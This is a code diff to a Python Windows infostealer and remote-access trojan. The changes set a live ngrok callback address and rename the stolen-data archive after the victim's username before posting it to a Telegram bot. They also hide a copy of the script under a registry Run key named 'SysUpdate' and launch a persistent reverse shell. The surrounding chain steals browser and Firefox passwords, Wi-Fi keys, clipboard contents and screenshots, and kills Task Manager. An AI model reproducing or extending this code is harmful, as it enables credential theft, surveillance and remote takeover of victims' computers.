@@ -31,8 +31,8 @@ import ctypes
 # === CONFIG ===
 BOT_TOKEN = "<<BOT_TOKEN>>"
 CHAT_ID = "<<CHAT_ID>>"
-NGROK_HOST = "<<NGROK_HOST>>"
-NGROK_PORT = int("<<NGROK_PORT>>")
+NGROK_HOST = "4.tcp.eu.ngrok.io"
+NGROK_PORT = 17534
 EXTRACT_FOLDER = os.path.join(os.getenv("APPDATA"), ".sysdata")  # Hidden folder
 ARCHIVE_NAME = "exfil_data.zip"
 
@@ -280,15 +280,16 @@ def clipper():
 
 # === ZIP & TELEGRAM ===
 def send_zip_to_telegram():
-    shutil.make_archive("exfil_data", "zip", EXTRACT_FOLDER)
+    zip_name = f"{getpass.getuser()}_exfil_data"
+    shutil.make_archive(zip_name, "zip", EXTRACT_FOLDER)
     try:
-        with open("exfil_data.zip", "rb") as f:
+        with open(f"{zip_name}.zip", "rb") as f:
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                 data={"chat_id": CHAT_ID},
-                files={"document": f}
+                files={"document": (f"{zip_name}.zip", f)}
             )
-        os.remove("exfil_data.zip")
+        os.remove(f"{zip_name}.zip")
     except Exception as e:
         print(f"[!] Telegram send failed: {e}")
 
@@ -296,9 +297,13 @@ def send_zip_to_telegram():
 def persist():
     try:
         path = os.path.abspath(__file__)
+        dest_path = os.path.join(EXTRACT_FOLDER, os.path.basename(path))
+        if not os.path.exists(dest_path):
+            shutil.copy2(path, dest_path)
+            subprocess.call(f'attrib +h "{dest_path}"', shell=True)
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
             r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "SysUpdate", 0, winreg.REG_SZ, path)
+        winreg.SetValueEx(key, "SysUpdate", 0, winreg.REG_SZ, dest_path)
         winreg.CloseKey(key)
     except: pass
 
@@ -460,59 +465,48 @@ def reverse_shell():
                         s.send(output)
                     except subprocess.CalledProcessError as e:
                         send_data(f"[!] Error: {e.output.decode()}")
+            s.close()
+        except:
+            time.sleep(30)
 
         # except Exception as e:
         #     print(f"[!] Reverse shell failed: {e}")
         # finally:
-            s.close()
-        except Exception as e:
-            # Try again in 60 seconds
-            print(f"[!] Connection failed: {e}")
-            time.sleep(30)
+        #     s.close()
 
 
 import pyautogui
 pyautogui.FAILSAFE = False
 
 # === EXECUTE CHAIN ===
-def payload_chain():
-    try:
-        launch_distraction_app()
-        profile_system()
-        take_screenshot()
-        if check_webcam():
-            with open(os.path.join(EXTRACT_FOLDER, "webcam.txt"), "w") as f:
-                f.write("Webcam detected.")
-        extract_wifi()
-        detect_vm()
-        kill_taskmgr()
-        clipper()
-        steal_browser()
-        steal_firefox_passwords()
-        send_zip_to_telegram()
-        persist()
-        fake_input()
-    except Exception as e:
-        pass
-
 def run():
-    # Thread 1: background actions
-    threading.Thread(target=payload_chain, daemon=True).start()
-
-    # Thread 2: reverse shell that never stops
+    launch_distraction_app()
+    threading.Thread(target=clipper_loop, daemon=True).start()
+    threading.Thread(target=reverse_shell, daemon=True).start()  # ← NEW LINE
+    profile_system()
+    take_screenshot()
+    if check_webcam():
+        with open(os.path.join(EXTRACT_FOLDER, "webcam.txt"), "w") as f:
+            f.write("Webcam detected.")
+    extract_wifi()
+    detect_vm()
+    kill_taskmgr()
+    clipper()
+    steal_browser()
+    steal_firefox_passwords()
+    send_zip_to_telegram()
+    persist()
+    fake_input()
     while True:
-        try:
-            reverse_shell()
-        except Exception as e:
-            print(f"[!] Reverse shell failed: {e}")
-            time.sleep(30)
+        time.sleep(10)
+
 
 if __name__ == "__main__":
-    try:
-        threading.Thread(target=clipper_loop, daemon=True).start()
-        run()
-    except Exception:
-        pass
-
+    while True:
+        try:
+            run()
+        except Exception as e:
+            pass  # Optionally print or log this
+        time.sleep(30)
 
 
